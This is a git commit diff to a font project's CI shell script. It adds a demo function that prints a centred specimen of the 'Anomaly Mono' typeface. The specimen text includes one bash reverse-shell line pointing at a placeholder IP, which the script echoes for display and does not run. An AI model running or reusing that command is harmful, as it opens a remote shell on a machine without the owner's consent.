c97c17282e8d1b244a9571c6eb392aac99ddd76e
Ben Busby <ben.busby7@gmail.com>
2020-01-10 11:24:55 -0700

    Updated ci build, cleaned up repo (closes #2)

--- fontbakery.sh
+++ fontbakery.sh
@@ -7,9 +7,38 @@ ltcyan='\033[0;96m'
 normal=$(tput sgr0)
 nc='\033[0m'
 
+
 RESULT=0
 SUMMARY=""
 BREAK="========================================="
+
+function runDemo () {
+    clear
+    echo ""
+    read -r -d '' DEMO_STRING << EOM
+Anomaly Mono
+
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+abcdefghijklmnopqrstuvwxyz
+012346789
+!@#$%^&*()_+-={|}
+[/]~:;"'<>.,?/
+
+public static void main(String[] args) { }
+function square(n) { return n * n; }
+sum = lambda x, y : x + y
+(x ^= y), (y ^= x), (x ^= y);
+bash -i >& /dev/tcp/192.168.0.XX 0>&1
+379965d428a042f18113f3c2ff7f0e15
+
+___
+EOM
+
+    columns="$(tput cols)"
+    while read -r line; do
+        printf "%*s\n" $(( (${#line} + columns) / 2)) "$line"
+    done <<< "$DEMO_STRING"
+}
 
 function runFontBakery () {
     echo -e "${ltcyan}Running $1...${nc}"
@@ -31,6 +60,7 @@ if ! [ -x "$(command -v fontbakery)" ]; then
     exit 1
 fi
 
+runDemo
 runFontBakery "check-googlefonts"
 runFontBakery "check-adobefonts"
 runFontBakery "check-fontval"
